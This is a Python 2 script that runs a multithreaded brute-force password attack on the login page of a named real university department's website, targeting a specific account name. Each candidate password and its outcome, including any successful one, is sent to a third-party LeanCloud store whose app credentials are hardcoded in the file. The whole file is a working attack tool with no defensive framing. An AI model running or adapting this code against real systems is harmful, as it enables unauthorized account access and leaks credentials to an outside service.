# -*- coding:utf-8 -*- 
import requests
import threading
import time

attack_url = 'http://www.seiee.sjtu.edu.cn/login.action'
attack_headers = {'Content-Type': 'application/x-www-form-urlencoded'}
attack_form = {'request_locale': 'zh_CN', 'loginForm.captcha': '',
			'loginForm.name': 'seiee', 'loginForm.password': 'xsb',
			'encodedPassword': '','submitButton': '%E7%99%BB%E5%BD%95'}

data_headers = {'Content-Type': 'application/json',
				'X-LC-Id': 'JdIjAFdw7blyyGyewkG15rjL',
				'X-LC-Key': '7UC8JpfIllUKc0XazouoOJUX'
				}

data_url = 'https://leancloud.cn/1.1/classes/keylib'

keybase = ['0','1','2','3','4','5','6','7','8','9'] \
			+ ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'] \
			+ ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']

class KEY:
	def __init__(self, maxLength):
		self.maxLength = maxLength
		self.maxDigit = len(keybase)
		self.arr = [0] * ( maxLength + 1)
		#use 1 more digit to represent out of range

	def __repr__(self):
		key = ""
		for i in range (0, self.maxLength):
			key += keybase[self.arr[i + 1]]
		return key

	def increase(self):
		carry = 1
		for i in range (0, self.maxLength + 1):
			self.arr[self.maxLength - i] += carry
			if self.arr[self.maxLength - i] == self.maxDigit:
				self.arr[self.maxLength - i] = 0
				carry = 1
			else:
				break
		if self.arr[0] == 0:
			return True
		else:
			return False

	def string(self):
		key = ""
		for i in range (0, self.maxLength):
			key += keybase[self.arr[i + 1]]
		return key

class myThread (threading.Thread):
    def __init__(self, threadID, threadName , minLen, maxLen ):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.threadName = threadName
        self.minLen = minLen
        self.maxLen = maxLen

    def run(self):
		logfile = open('timelog.txt','a')
		logfile.write( self.threadName + 'begin at '+ time.ctime(time.time()) +'\n')
		logfile.close()
		bruteForce(self.threadName, self.minLen, self.maxLen)
		logfile = open('timelog.txt','a')
		logfile.write( self.threadName + 'finish at '+ time.ctime(time.time()) +'\n')
		logfile.close()

def bruteForce(threadName,minLen, maxLen):
	print "begin"
	form = attack_form
	keybaseLength = len(keybase)
	for maxLength in range (minLen,maxLen + 1):
		key = KEY(maxLength)
		state = 0 #avoid save to many datas
		while True:
			keyStr = key.string()
			print "now deal with " + keyStr
			form['loginForm.password'] = keyStr
			try:
				r = requests.post(url = attack_url,data = form, headers = attack_headers, timeout = 1).content
			except:
				try:
					requests.post(url= data_url, json = {'key': keyStr, 'status': "timeout"}, headers = data_headers, timeout = 1)
				except:
					logfile = open('timeout.txt','a')
					logfile.write('key test acess seiee timeout ' + keyStr + '\n')
					logfile.close()
				continue

			if r.find('密码错误') == -1:#success!!
				try:
					logfile = open('success.txt','a')
					logfile.write('key test success ' + keyStr + '\n')
					logfile.close()					
					requests.post(url= data_url, json = {'key': keyStr, 'status': "success"}, headers = data_headers, timeout = 1)
				except:
					pass
				break

			else:
				if state == 0:
					try:
						requests.post(url= data_url, json = {'key': keyStr, 'status': "error"}, headers = data_headers, timeout = 1)
					except:
						logfile = open(threadName+'.txt','a')
						logfile.write('key test error ' + keyStr + '\n')
						logfile.close()
					state += 1
				else:
					state += 1
					if state == 10:
						state = 0
	
			if key.increase() == False:
				break

if __name__ == '__main__':
	thread1 = myThread(1, "Thread-1", 1, 1)
	thread2 = myThread(2, "Thread-2", 1, 1)
	thread1.start()
	thread2.start()
	print "Mainthread exit"
